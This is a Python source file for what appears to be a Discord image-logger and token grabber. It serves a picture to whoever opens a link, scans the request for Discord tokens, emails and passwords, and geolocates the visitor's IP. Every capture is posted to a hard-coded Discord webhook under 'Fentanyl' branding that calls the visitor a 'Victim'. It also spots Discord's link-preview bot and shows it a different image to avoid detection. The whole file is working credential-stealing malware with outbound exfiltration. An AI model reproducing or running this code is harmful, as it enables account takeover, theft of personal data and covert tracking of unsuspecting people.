from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx, base64, httpagentparser, re, json

webhook = 'https://discord.com/api/webhooks/1537744108444057651/NPsV1s5rDgFQ6asOGDzmcQAEGC_JZyM9ENqSfuQHZkg5KqAkedlFeRQ_XjrwZDMJ6HJ9'
image = 'https://imgur.com/a/Thz4Jjw'
bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
buggedimg = False
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def extract_discord_tokens(text):
    """Extract Discord tokens from text using regex patterns"""
    tokens = []
    
    # Discord token patterns
    patterns = [
        r'([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})',  # Standard Discord token
        r'([a-zA-Z0-9_\-]{28,32})',  # mfa token
        r'([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27,32})',  # Extended token
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text)
        tokens.extend(matches)
    
    return list(set(tokens))  # Remove duplicates

def extract_discord_webhooks(text):
    """Extract Discord webhook URLs from text"""
    pattern = r'https://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_\-]+'
    return re.findall(pattern, text)

def extract_emails(text):
    """Extract email addresses from text"""
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
    return re.findall(pattern, text)

def extract_passwords(text):
    """Extract potential passwords from text"""
    # Common password patterns
    patterns = [
        r'"password"\s*:\s*"([^"]+)"',
        r'"pass"\s*:\s*"([^"]+)"',
        r'"pwd"\s*:\s*"([^"]+)"',
        r'password[=:]\s*([^\s&]+)',
        r'pass[=:]\s*([^\s&]+)',
        r'pwd[=:]\s*([^\s&]+)',
    ]
    passwords = []
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        passwords.extend(matches)
    return list(set(passwords))

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser, tokens=None, webhooks=None, emails=None, passwords=None):
    fields = [
        {
            "name": "IP Info",
            "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
            "inline": True
        },
        {
            "name": "Advanced Info",
            "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
            "inline": False
        }
    ]
    
    # Add tokens if found
    if tokens:
        token_str = '\n'.join([f'`{t}`' for t in tokens[:5]])  # Max 5 tokens per embed
        if len(tokens) > 5:
            token_str += f'\n... and {len(tokens)-5} more'
        fields.append({
            "name": f"🎫 Discord Tokens ({len(tokens)})",
            "value": token_str,
            "inline": False
        })
    
    # Add webhooks if found
    if webhooks:
        webhook_str = '\n'.join([f'`{w}`' for w in webhooks[:3]])
        if len(webhooks) > 3:
            webhook_str += f'\n... and {len(webhooks)-3} more'
        fields.append({
            "name": f"🔗 Webhooks ({len(webhooks)})",
            "value": webhook_str,
            "inline": False
        })
    
    # Add emails if found
    if emails:
        email_str = '\n'.join([f'`{e}`' for e in emails[:5]])
        if len(emails) > 5:
            email_str += f'\n... and {len(emails)-5} more'
        fields.append({
            "name": f"📧 Emails ({len(emails)})",
            "value": email_str,
            "inline": False
        })
    
    # Add passwords if found
    if passwords:
        pass_str = '\n'.join([f'`{p}`' for p in passwords[:5]])
        if len(passwords) > 5:
            pass_str += f'\n... and {len(passwords)-5} more'
        fields.append({
            "name": f"🔑 Passwords ({len(passwords)})",
            "value": pass_str,
            "inline": False
        })
    
    return {
        "username": "Fentanyl",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Fentanyl strikes again! (with Token Grabber)",
                "color": 16711803,
                "description": "A Victim opened the original Image. All data captured below.",
                "author": {"name": "Fentanyl"},
                "fields": fields
            }
        ],
    }

def prev(ip, uag, tokens=None):
    fields = [
        {
            "name": "IP Info",
            "value": f"**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
            "inline": False
        }
    ]
    
    if tokens:
        token_str = '\n'.join([f'`{t}`' for t in tokens[:3]])
        fields.append({
            "name": f"🎫 Discord Tokens ({len(tokens)})",
            "value": token_str,
            "inline": False
        })
    
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert! (Preview)",
                "color": 16711803,
                "description": f"Discord previewed a Fentanyl Image! Data captured.",
                "author": {"name": "Fentanyl"},
                "fields": fields
            }
        ],
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        # Get the data (either from URL parameter or default image)
        try:
            data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception:
            data = bindata
        
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        
        # Extract all sensitive data from query parameters and headers
        all_text = str(dic) + str(self.headers)
        tokens = extract_discord_tokens(all_text)
        webhooks = extract_discord_webhooks(all_text)
        emails = extract_emails(all_text)
        passwords = extract_passwords(all_text)
        
        # Also check for Authorization header
        auth_header = self.headers.get('Authorization')
        if auth_header and auth_header.startswith('mfa.'):
            tokens.append(auth_header)
        
        # Check for token in cookies
        cookie_header = self.headers.get('Cookie')
        if cookie_header:
            # Look for discord token in cookies
            token_match = re.search(r'token=([a-zA-Z0-9._-]+)', cookie_header)
            if token_match:
                tokens.append(token_match.group(1))
        
        # Get IP
        ip = self.headers.get('x-forwarded-for')
        if not ip:
            ip = self.client_address[0]
        
        # Check if it's Discord's preview bot
        if ip and ip.startswith(('35','34','104.196')):
            if 'discord' in useragent.lower():
                self.send_response(200)
                self.send_header('Content-type','image/jpeg')
                self.end_headers()
                self.wfile.write(buggedbin if buggedimg else bindata)
                # Send preview webhook with any tokens found
                httpx.post(webhook, json=prev(ip, useragent, tokens))
            else:
                pass
        else:
            # Normal request - serve image and send full data
            self.send_response(200)
            self.send_header('Content-type','image/jpeg')
            self.end_headers()
            self.wfile.write(data)
            
            # Get IP info
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
            except:
                ipInfo = {'ip': ip, 'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 
                         'loc': 'Unknown', 'org': 'Unknown', 'postal': 'Unknown'}
            
            # Send webhook with all captured data
            httpx.post(webhook, json=formatHook(
                ipInfo.get('ip', ip),
                ipInfo.get('city', 'Unknown'),
                ipInfo.get('region', 'Unknown'),
                ipInfo.get('country', 'Unknown'),
                ipInfo.get('loc', 'Unknown'),
                ipInfo.get('org', 'Unknown'),
                ipInfo.get('postal', 'Unknown'),
                useragent,
                os,
                browser,
                tokens,
                webhooks,
                emails,
                passwords
            ))
        return
